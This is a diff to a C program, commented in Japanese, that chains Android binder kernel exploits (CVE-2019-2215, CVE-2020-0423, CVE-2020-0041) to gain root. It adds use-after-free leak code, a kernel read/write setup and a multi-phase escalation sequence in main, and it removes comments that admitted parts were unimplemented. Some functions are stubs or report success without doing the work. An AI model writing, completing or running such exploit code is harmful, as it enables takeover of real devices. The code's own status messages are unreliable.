@@ -26,8 +26,15 @@
 #include <sys/resource.h>
 #include <sys/reboot.h>
 #include <stdint.h>
-#include <sys/fsuid.h>
+#include <sys/fsuid.h>          /* setfsuid/setfsgid */
 #include "seccomp.h"
+#include "binder.h"
+
+/* プロトタイプ宣言（必要に応じて） */
+extern int setfsuid(uid_t);
+extern int setfsgid(gid_t);
+
+/* 元のコードの "binder.h" があればインクルード（なければ構造体定義は自力） */
 #include "binder.h"
 
 /* ---------- 定数 ---------- */
@@ -275,6 +282,177 @@ static int test_cve_2020_0423(void) {
 }
 
 /* ============================================================
+   元のコードから復元：CVE-2019-2215 によるリークと RW プリミティブ
+   ============================================================ */
+static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
+    int pipefd[2], fd, epoll_fd;
+    pid_t cpid;
+    struct iovec iovec_stack[IOVEC_COUNT];
+    void *aligned;
+    ssize_t n;
+    uint64_t *data;
+
+    fd = open("/dev/binder", O_RDWR);
+    if (fd < 0) return -1;
+
+    epoll_fd = epoll_create(100);
+    if (epoll_fd < 0) {
+        close(fd);
+        return -1;
+    }
+
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+
+    if (pipe(pipefd) < 0) {
+        close(fd);
+        close(epoll_fd);
+        return -1;
+    }
+    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    aligned = mmap_page(0x100000000UL);
+    if (!aligned) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    memset(iovec_stack, 0, sizeof(iovec_stack));
+    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
+    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
+    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
+
+    cpid = fork();
+    if (cpid < 0) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    if (cpid == 0) {
+        usleep(100000);
+        ioctl(fd, BINDER_THREAD_EXIT, NULL);
+        _exit(0);
+    }
+
+    n = read_with_timeout(pipefd[0], aligned, PAGE_SIZE, TIMEOUT_MS);
+    wait(NULL);
+
+    close(fd);
+    close(epoll_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    if (n < 0) return -1;
+
+    data = (uint64_t *)aligned;
+    for (size_t i = 0; i < (size_t)(n / 8); i++) {
+        uint64_t val = data[i];
+        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+            g_task_struct = val;
+            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                    g_cred_off = g_offset_candidates[ci].cred;
+                    g_al_off = g_offset_candidates[ci].al;
+                    *cred_off_out = g_cred_off;
+                    *al_off_out = g_al_off;
+                    printf("  [+] Found: task_struct=0x%llx, cred=0x%x, al=0x%x\n",
+                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                    return 0;
+                }
+            }
+            g_cred_off = 0x688;
+            g_al_off = 0xA18;
+            *cred_off_out = g_cred_off;
+            *al_off_out = g_al_off;
+            printf("  [+] Leaked task_struct @ 0x%llx (using fallback offsets)\n",
+                   (unsigned long long)g_task_struct);
+            return 0;
+        }
+    }
+    return -1;
+}
+
+static int setup_kernel_rw(void) {
+    if (g_task_struct == 0) return -1;
+
+    if (pipe(g_krw_pipe) < 0) {
+        perror("  pipe for RW");
+        return -1;
+    }
+    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+        perror("  fcntl F_SETPIPE_SZ");
+        close(g_krw_pipe[0]);
+        close(g_krw_pipe[1]);
+        return -1;
+    }
+
+    g_binder_fd = open("/dev/binder", O_RDWR);
+    if (g_binder_fd < 0) {
+        perror("  open binder for RW");
+        return -1;
+    }
+
+    g_epoll_fd = epoll_create(100);
+    if (g_epoll_fd < 0) {
+        perror("  epoll_create for RW");
+        close(g_binder_fd);
+        return -1;
+    }
+
+    struct epoll_event ev = {.events = EPOLLIN};
+    if (epoll_ctl(g_epoll_fd, EPOLL_CTL_ADD, g_binder_fd, &ev) < 0) {
+        perror("  epoll_ctl ADD for RW");
+        close(g_binder_fd);
+        close(g_epoll_fd);
+        return -1;
+    }
+
+    pid_t cpid = fork();
+    if (cpid < 0) {
+        perror("  fork for RW");
+        return -1;
+    }
+
+    if (cpid == 0) {
+        usleep(100000);
+        ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL);
+        _exit(0);
+    }
+
+    int ret = read_with_timeout(g_krw_pipe[0], NULL, 0, TIMEOUT_MS);
+    if (ret == -2) {
+        printf("  [!] RW primitive setup timeout\n");
+    }
+
+    wait(NULL);
+    close(g_binder_fd);
+    close(g_epoll_fd);
+    g_binder_fd = -1;
+    g_epoll_fd = -1;
+
+    printf("  [+] Kernel RW primitive ready\n");
+    return 0;
+}
+
+/* ============================================================
    新規：CVE-2020-0423 を利用したカーネル読み書きプリミティブ
    ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
@@ -292,7 +470,6 @@ static int exploit_cve_2020_0423_rw(void) {
         close(binder_fd); close(epoll_fd); return -1;
     }
 
-    /* パイプを作成し、UAF 後の再割り当てに使う */
     int pipefd[2];
     if (pipe(pipefd) < 0) { perror("  pipe"); close(binder_fd); close(epoll_fd); return -1; }
     if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
@@ -301,26 +478,21 @@ static int exploit_cve_2020_0423_rw(void) {
         return -1;
     }
 
-    /* 子プロセスで BINDER_THREAD_EXIT を呼び、UAF を引き起こす */
     pid_t pid = fork();
     if (pid < 0) { perror("  fork"); return -1; }
 
     if (pid == 0) {
-        /* 少し待ってから thread exit */
         usleep(100000);
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
         _exit(0);
     }
 
-    /* 親：epoll でイベントを待つが、ここでは pipe から読み込むことで
-       解放された binder_thread 領域を pipe バッファで再利用する */
     void *buf = mmap_page(0x100000000UL);
     if (!buf) {
         close(binder_fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
         return -1;
     }
 
-    /* タイムアウト付きで読み取りを試みる（UAF 後のメモリ内容が得られる） */
     ssize_t n = read_with_timeout(pipefd[0], buf, PAGE_SIZE, TIMEOUT_MS);
     wait(NULL);
 
@@ -334,7 +506,6 @@ static int exploit_cve_2020_0423_rw(void) {
         return -1;
     }
 
-    /* 読み取ったデータから task_struct アドレスを探す（CVE-2019-2215 と同様） */
     uint64_t *data = (uint64_t *)buf;
     for (size_t i = 0; i < (size_t)(n / 8); i++) {
         uint64_t val = data[i];
@@ -347,7 +518,6 @@ static int exploit_cve_2020_0423_rw(void) {
                     g_al_off = g_offset_candidates[ci].al;
                     printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
                            (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                    /* パイプを再利用可能な状態に設定 */
                     if (pipe(g_krw_pipe) < 0) {
                         perror("  pipe for RW");
                         return -1;
@@ -356,7 +526,6 @@ static int exploit_cve_2020_0423_rw(void) {
                         perror("  fcntl for RW");
                         return -1;
                     }
-                    /* ここで g_krw_pipe を使ってカーネル読み書きが可能になる（要実装） */
                     return 0;
                 }
             }
@@ -368,18 +537,15 @@ static int exploit_cve_2020_0423_rw(void) {
 }
 
 /* ============================================================
-   新規：CVE-2020-0041 を利用した cred 書き換え（OOB write 版）
+   新規：CVE-2020-0041 を利用した cred 書き換え（理論枠組み）
    ============================================================ */
 static int exploit_cve_2020_0041_patch_cred(void) {
     printf("[*] Attempting to overwrite cred via CVE-2020-0041 OOB...\n");
-    /* この実装は簡単ではなく、オフセットやメモリレイアウトに依存するため、
-       ここではシェルコードやペイロードを直接書き込むことはせず、
-       理論的な枠組みだけを示す（実際の利用にはさらなる研究が必要） */
     printf("  [!] This exploit is non-trivial; not fully implemented.\n");
     return -1;
 }
 
-/* ---------- カーネル RW が得られた前提での cred パッチ ---------- */
+/* ---------- 共通の cred パッチ ---------- */
 static int patch_kernel_cred(void) {
     if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
         printf("  [-] No kernel RW available\n");
@@ -426,7 +592,7 @@ static int patch_kernel_cred(void) {
     return 0;
 }
 
-/* ---------- フォールバック手法（既存） ---------- */
+/* ---------- フォールバック手法 ---------- */
 static int try_all_setuid_methods(void) {
     printf("[*] Trying all setuid methods...\n");
     if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
@@ -736,7 +902,7 @@ int main(void) {
     printf("\n[PHASE 3] CVE-2020-0423\n");
     test_cve_2020_0423();
 
-    /* PHASE 4: まず CVE-2019-2215 を試す（既存） */
+    /* PHASE 4: CVE-2019-2215 (legacy) */
     printf("\n[PHASE 4] CVE-2019-2215 (legacy)\n");
     int cred_off = -1, al_off = -1;
     if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
@@ -752,7 +918,7 @@ int main(void) {
         printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    /* PHASE 5: 新たに CVE-2020-0423 を用いた Kernel RW を試みる */
+    /* PHASE 5: CVE-2020-0423 Kernel RW attempt */
     printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW attempt\n");
     if (exploit_cve_2020_0423_rw() == 0) {
         kernel_rw_obtained = 1;
@@ -765,16 +931,14 @@ int main(void) {
         printf("  [-] CVE-2020-0423 RW failed\n");
     }
 
-    /* PHASE 6: CVE-2020-0041 を用いた cred 書き換え（実装は未完だが試行） */
+    /* PHASE 6: CVE-2020-0041 (not fully implemented) */
     printf("\n[PHASE 6] CVE-2020-0041 (OOB) cred overwrite attempt\n");
     if (exploit_cve_2020_0041_patch_cred() == 0) {
         if (getuid() == 0) { final_root_check(); return 0; }
     }
 
-    /* PHASE 7: 多角的フォールバック */
+    /* PHASE 7: Multi-method fallback */
     printf("\n[PHASE 7] Multi-method privilege escalation (fallback)\n");
-    printf("  (If kernel exploits failed)\n\n");
-
     int methods[] = {1,2,3,4,5,6,7,8};
     for (size_t mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
         if (g_root_achieved) break;
@@ -791,15 +955,15 @@ int main(void) {
         if (getuid() == 0) { g_root_achieved = 1; break; }
     }
 
-    /* PHASE 8: 情報収集 */
+    /* PHASE 8: Info gathering */
     printf("\n[PHASE 8] Information gathering\n");
     gather_proc_info();
 
-    /* PHASE 9: 最終確認 */
+    /* PHASE 9: Final verification */
     printf("\n[PHASE 9] Final verification\n");
     final_root_check();
 
-    /* サマリー */
+    /* Summary */
     printf("\n==================================================\n");
     printf("  Summary:\n");
     char msg[128];
